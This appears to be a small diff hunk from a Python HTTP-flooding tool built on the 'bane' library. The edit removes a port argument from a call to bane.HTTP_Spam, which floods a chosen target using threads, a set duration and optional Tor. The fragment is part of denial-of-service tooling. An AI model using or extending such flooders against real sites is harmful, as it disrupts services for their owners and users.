@@ -84,7 +84,7 @@ while True:
         print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
 
 if spam_mode==True:
-    http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method)
+    http_flooder_instance = bane.HTTP_Spam(target,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method)
 else:
     if port==443:
         target="https://"+target+'/'
